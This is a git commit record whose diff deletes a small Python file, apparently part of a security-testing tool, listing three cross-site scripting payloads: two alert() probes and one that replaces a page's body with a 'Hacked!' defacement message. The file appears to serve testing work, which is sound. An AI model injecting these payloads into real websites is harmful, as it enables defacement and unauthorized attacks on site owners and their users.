ad61c0e9d5b3ef51348bd82b7575b196e7fd753e
evgsam <evgsamarin@gmail.com>
2026-02-02 20:35:35 +0300

    подчистил

--- src/payloads.py
+++
@@ -1,9 +0,0 @@
-XSS_PAYLOADS = [
-    "<script>alert('test')</script>",
-    "<img src=\"nonexistent.jpg\" onerror=\"alert('XSS')\">",
-    "<script>document.body.innerHTML = '<h1>Hacked!</h1><p>This site has been compromised.</p>';</script>"
-]
-
-def get_payloads()->list:
-    return XSS_PAYLOADS
-
